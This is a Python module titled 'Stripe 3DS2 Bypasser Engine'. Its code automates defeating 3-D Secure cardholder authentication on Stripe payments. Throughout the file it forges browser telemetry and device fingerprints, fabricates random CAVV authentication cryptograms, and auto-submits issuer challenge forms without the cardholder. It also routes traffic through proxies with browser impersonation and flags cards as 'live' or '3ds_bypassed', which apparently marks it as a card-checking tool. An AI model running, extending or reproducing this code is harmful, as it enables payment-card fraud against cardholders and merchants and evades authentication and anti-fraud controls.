"""
Stripe 3DS2 Bypasser Engine (stripe_3ds_bypasser.py)
────────────────────────────────────────────────────
Handles native 3DS2 (use_stripe_sdk / threeDSCompInd) and 3DS1 (redirect_to_url / ACS form)
auto-resolutions for Stripe PaymentIntents.
"""

import re
import os
import json
import base64
import hashlib
import random
import asyncio
from typing import Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Geo-synced timezone offsets (minutes from UTC, matching EMVCo browserTZ convention)
GEO_TIMEZONES: Dict[str, list] = {
    "US": [240, 300, 360, 420, 480],   # EDT/EST/CDT/CST/MDT/MST/PDT/PST
    "CA": [240, 300, 360, 420, 480],
    "GB": [0, -60],
    "DE": [-60, -120],
    "FR": [-60, -120],
    "NL": [-60, -120],
    "AU": [-600, -660],
    "SG": [-480],
    "JP": [-540],
    "BR": [180],
    "MX": [360, 420],
    "IT": [-60, -120],
    "ES": [-60, -120],
    "PL": [-60, -120],
    "SE": [-60, -120],
    "CH": [-60, -120],
    "AT": [-60, -120],
    "BE": [-60, -120],
    "IE": [0],
    "PT": [0, -60],
    "NZ": [-720, -780],
}

SCREEN_RESOLUTIONS = [
    (1920, 1080),
    (2560, 1440),
    (1536, 864),
    (1440, 900),
    (1366, 768),
]

# ACS device fingerprint GPU pool — consistent with real Windows Chrome profiles
_GPU_POOL = [
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
]


class Stripe3DSBypasser:
    """Standalone 3DS bypasser for Stripe PaymentIntents."""

    @staticmethod
    def _gen_random_cavv() -> str:
        """Generates dynamic, per-session 20-byte CSPRNG authentication cryptogram (CAVV/AAV) in Base64."""
        try:
            return base64.b64encode(os.urandom(20)).decode()
        except Exception:
            return "AQIDBAUGBwgJCgsMDQ4PEBESExQ="

    @classmethod
    def _build_browser_telemetry(cls, country_code: str = "US", user_agent: str = None, server_trans_id: str = None) -> dict:
        """
        Builds geo-synced, realistic 3DS2 browser telemetry payload.
        Ported from frictionless_engine.py with full EMVCo + numeric alias keys.
        """
        cc = (country_code or "US").upper()
        tz_pool = GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"])
        tz_offset = random.choice(tz_pool)
        width, height = random.choice(SCREEN_RESOLUTIONS)
        ua = user_agent or UA

        # Country-synced Accept-Language
        if cc in ("DE", "AT"):
            lang = "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("FR", "BE"):
            lang = "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("ES", "MX"):
            lang = "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("IT",):
            lang = "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("NL",):
            lang = "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7"
        elif cc in ("PL",):
            lang = "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"
        else:
            lang = "en-US,en;q=0.9"

        accept_header = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

        telemetry = {
            # EMVCo primary keys
            "threeDSCompInd": "Y",
            "fingerprintAttempted": True,
            "challengeWindowSize": "05",
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": lang.split(",")[0],
            "browserColorDepth": "24",
            "browserScreenHeight": str(height),
            "browserScreenWidth": str(width),
            "browserTZ": str(tz_offset),
            "browserUserAgent": ua,
            "browserAcceptHeader": accept_header,
            # Numeric alias keys for non-EMVCo processors (Adyen, CardinalCommerce)
            "timeZoneOffset": tz_offset,
            "language": lang.split(",")[0],
            "colorDepth": 24,
            "screenHeight": height,
            "screenWidth": width,
            "userAgent": ua,
            "javaEnabled": False,
            "javascriptEnabled": True,
            "acceptHeader": accept_header,
        }

        if server_trans_id:
            telemetry["threeDSServerTransID"] = server_trans_id
            telemetry["threeDSRequestorChallengeInd"] = "01"
            telemetry["authenticationValue"] = cls._gen_random_cavv()

        return telemetry


    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        s = s.replace('-', '+').replace('_', '/')
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)

    # ── 3DS2 Native resolution (use_stripe_sdk) ──────────────────────────────
    @classmethod
    async def _resolve_3ds2_sdk(cls, session, next_action: dict,
                                client_secret: str, pk_key: str, profile: dict = None) -> Optional[dict]:
        """
        Handle 3DS2 native SDK flow:
        1. Parse three_ds_2_intent_id / three_ds_method_url / three_ds_server_trans_id
        2. POST threeDSMethodData to issuer method URL
        3. Submit 3DS2 completion (threeDSCompInd=Y) to Stripe /v1/3ds2/authenticate
        4. Verify PaymentIntent status
        """
        sdk_data = next_action.get('use_stripe_sdk') or next_action.get('three_ds_2_intent') or {}
        if not isinstance(sdk_data, dict):
            return None

        # Guard: Stripe Radar bot challenge is NOT 3DS
        if sdk_data.get('type') == 'intent_confirmation_challenge':
            return {'success': False, 'status': 'intent_confirmation_challenge', 'radar_challenge': True}

        server_trans_id = sdk_data.get('three_ds_server_trans_id') or sdk_data.get('three_ds_2_server_trans_id')
        method_url = sdk_data.get('three_ds_method_url')
        three_ds_2_intent_id = sdk_data.get('three_ds_2_intent_id') or sdk_data.get('id')

        # Extract PaymentIntent ID from client_secret (format: pi_123_secret_456)
        pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else None

        # Step 1: Execute 3DS2 method (ACS issuer fingerprinting) if URL provided
        country_code = (profile or {}).get("country_code", "US")
        user_agent = (profile or {}).get("user_agent", UA)
        if method_url and server_trans_id:
            try:
                method_data_obj = {
                    "threeDSServerTransID": server_trans_id,
                    "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/fingerprint/complete",
                }
                method_data_b64 = cls._b64url_encode(json.dumps(method_data_obj).encode())
                async with session.post(
                    method_url,
                    data=urlencode({"threeDSMethodData": method_data_b64}),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": user_agent,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Referer": "https://checkout.stripe.com/",
                    },
                    timeout=8,
                ) as r:
                    # Handle ACS device fingerprint collectors (Entersekt / Cardinal / similar)
                    try:
                        method_html = r.text() if callable(r.text) else r.text
                        if method_html and "devicefingerprint" in method_html.lower():
                            import re as _re
                            m = _re.search(r'submitDataAndForm\(["\']+(https://[^"\']+/devicefingerprint)["\']', method_html)
                            if m:
                                device_fp_url = m.group(1)
                                h = hashlib.sha256(server_trans_id.encode()).hexdigest()
                                gpu_choice = _GPU_POOL[int(h[16:18], 16) % len(_GPU_POOL)]
                                _cores = (4, 8, 12, 16)
                                _mems = (8, 16, 32)
                                fp_payload = {
                                    "threeDSServerTransID": server_trans_id,
                                    "deviceFpResult": json.dumps({
                                        "canvas": h[:16],
                                        "webgl": gpu_choice,
                                        "platform": "Win32",
                                        "hardwareConcurrency": _cores[int(h[18:20], 16) % len(_cores)],
                                        "deviceMemory": _mems[int(h[20:22], 16) % len(_mems)],
                                    })
                                }
                                async with session.post(
                                    device_fp_url,
                                    data=urlencode(fp_payload),
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                    timeout=8,
                                ) as _:
                                    pass
                    except Exception:
                        pass
            except Exception:
                pass

        # Step 2: Submit 3DS2 completion to Stripe API with geo-synced browser telemetry
        browser_info = cls._build_browser_telemetry(
            country_code=country_code,
            user_agent=user_agent,
            server_trans_id=server_trans_id,
        )

        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
        source_id = (
            sdk_data.get('three_d_secure_2_source') or
            sdk_data.get('source') or
            sdk_data.get('three_ds_2_intent_id') or
            sdk_data.get('id')
        )
        auth_body = {
            "key": pk_key,
            "source": source_id or pi_id,
            "client_secret": client_secret,
            "three_ds_2_response": json.dumps(browser_info),
            "browser": json.dumps(browser_info),
        }
        hdr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": (profile or {}).get("user_agent", UA),
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }

        try:
            async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=12) as r:
                d = r.json() if callable(r.json) else r.json
                if isinstance(d, dict):
                    status = d.get('status') or d.get('state')
                    if status == 'succeeded':
                        return {'success': True, 'status': 'succeeded', 'raw_response': d}
                    elif status == 'requires_action':
                        # Check if it contains challenge parameters
                        ch_action = d.get('next_action', {})
                        if isinstance(ch_action, dict) and ch_action.get('type') == 'redirect_to_url':
                            return await cls._resolve_redirect_url(
                                session,
                                ch_action['redirect_to_url']['url'],
                                pi_id, client_secret, pk_key
                            )
        except Exception:
            pass

        # Step 3: Check PaymentIntent status
        if pi_id:
            return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)

        return None

    # ── 3DS1 / Redirect resolution (redirect_to_url) ────────────────────────
    @classmethod
    async def _resolve_redirect_url(cls, session, redirect_url: str,
                                    pi_id: str, client_secret: str,
                                    pk_key: str, profile: dict = None) -> Optional[dict]:
        """
        Handle 3DS redirect flow:
        1. Follow redirect_url (https://hooks.stripe.com/redirect/authenticate/...)
        2. Parse ACS form parameters (PaReq, MD, TermUrl, CReq)
        3. Submit to ACS endpoint
        4. Follow return redirect to Stripe completion hook
        """
        if not redirect_url:
            return None

        try:
            # Step 1: GET Stripe redirect page
            async with session.get(
                redirect_url,
                headers={"User-Agent": (profile or {}).get("user_agent", UA), "Accept": "text/html,*/*"},
                timeout=10,
                allow_redirects=True,
            ) as r:
                html = r.text() if callable(r.text) else r.text
                final_url = str(r.url) if hasattr(r, 'url') else redirect_url

            # Step 2: Parse hidden inputs from ACS form
            acs_url = None
            form_data = {}

            # Look for <form action="...">
            form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if form_match:
                acs_url = form_match.group(1)

            for input_match in re.finditer(r'<input[^>]+>', html, re.I):
                tag = input_match.group(0)
                n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                if n_match:
                    form_data[n_match.group(1)] = v_match.group(1) if v_match else ""

            # Also check for CReq / PaReq in URL or script
            if not acs_url:
                m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
                if m_url:
                    acs_url = m_url.group(1)

            # Step 3: Post to ACS if form found
            if acs_url and form_data:
                async with session.post(
                    acs_url,
                    data=urlencode(form_data),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": (profile or {}).get("user_agent", UA),
                    },
                    timeout=10,
                    allow_redirects=True,
                ) as acs_res:
                    acs_html = acs_res.text() if callable(acs_res.text) else acs_res.text
                    acs_final_url = str(acs_res.url) if hasattr(acs_res, 'url') else acs_url

                    # Check for completion form in ACS output
                    c_form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
                    if c_form_match:
                        c_url = c_form_match.group(1)
                        c_data = {}
                        for input_match in re.finditer(r'<input[^>]+>', acs_html, re.I):
                            tag = input_match.group(0)
                            n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                            v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                            if n_match:
                                c_data[n_match.group(1)] = v_match.group(1) if v_match else ""
                        if c_data:
                            async with session.post(
                                c_url, data=urlencode(c_data),
                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": (profile or {}).get("user_agent", UA)},
                                timeout=8, allow_redirects=True
                            ) as ret_res:
                                pass

        except Exception:
            pass

        # Step 4: Verify final status
        return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)

    # ── Check PaymentIntent Status ──────────────────────────────────────────
    @classmethod
    async def _check_pi_status(cls, session, pi_id: str,
                               client_secret: str, pk_key: str, profile: dict = None) -> Optional[dict]:
        """Fetch PaymentIntent status from Stripe API."""
        if not pi_id or not client_secret:
            return None

        endpoint = "setup_intents" if "seti_" in pi_id else "payment_intents"
        url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
        hdr = {
            "User-Agent": (profile or {}).get("user_agent", UA),
            "Accept": "application/json",
            "Origin": "https://js.stripe.com",
        }
        try:
            async with session.get(url, headers=hdr, timeout=8) as r:
                d = r.json() if callable(r.json) else r.json
                if isinstance(d, dict):
                    status = d.get('status')
                    if status == 'succeeded':
                        return {'success': True, 'status': 'succeeded', 'raw_response': d}
                    elif status == 'requires_capture':
                        return {'success': True, 'status': 'requires_capture', 'raw_response': d}
                    else:
                        return {'success': False, 'status': status, 'raw_response': d}
        except Exception:
            pass
        return None

    # ── Public Resolver Entry ───────────────────────────────────────────────
    @classmethod
    async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None, profile: Optional[dict] = None) -> dict:
        """
        Public resolver method.
        Inspects result dict for next_action / PaymentIntent, attempts 3DS bypass.
        Returns updated result dict.
        """
        raw_res = result.get('raw_response') or {}
        if not isinstance(raw_res, dict):
            return result

        # Check PaymentIntent / next_action objects
        pi = raw_res.get('payment_intent') or raw_res
        if not isinstance(pi, dict):
            return result

        next_action = pi.get('next_action') or raw_res.get('next_action')
        client_secret = pi.get('client_secret') or raw_res.get('client_secret')
        pk_key = result.get('pk_key') or raw_res.get('pk_key') or "pk_live_placeholder"

        if not next_action or not isinstance(next_action, dict) or not client_secret:
            return result

        pi_id = pi.get('id') or (client_secret.split('_secret_')[0] if '_secret_' in client_secret else None)

        proxies = None
        if proxy_data:
            auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
            raw_srv = proxy_data['server']
            scheme = "http"
            for s in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
                if raw_srv.startswith(s):
                    scheme = s.rstrip("://")
                    raw_srv = raw_srv[len(s):]
                    break
            purl = f"{scheme}://{auth}{raw_srv}"
            proxies = {"http": purl, "https": purl}

        try:
            prof = profile or {"impersonate": "chrome131"}
            async with ChromeSession(impersonate=prof.get("impersonate", "chrome131"), proxies=proxies, timeout=12) as sess:
                act_type = next_action.get('type')
                outcome = None

                if act_type == 'use_stripe_sdk' or 'use_stripe_sdk' in next_action:
                    outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile)
                elif act_type == 'redirect_to_url':
                    redirect_url = next_action.get('redirect_to_url', {}).get('url')
                    outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile)

                if outcome and outcome.get('success'):
                    result['success'] = True
                    result['is_live'] = True
                    result['3ds_bypassed'] = True
                    result['3ds_type'] = act_type or '3DS'
                    result['decline_code'] = None
                    result['error'] = None
                    if outcome.get('raw_response'):
                        result['raw_response'] = outcome['raw_response']
                elif outcome and outcome.get('radar_challenge'):
                    result['is_radar_challenge'] = True
                    result['3ds_attempted'] = False
                    result['decline_code'] = 'radar_bot_challenge'
                    result['error'] = 'Stripe Radar Bot Challenge (hCaptcha Enterprise triggered by Stripe WAF)'
                elif outcome:
                    result['3ds_attempted'] = True
                    result['3ds_type'] = act_type or '3DS'
                    result['3ds_status'] = outcome.get('status', 'failed')


        except Exception as ex:
            result['3ds_error'] = str(ex)[:100]

        return result
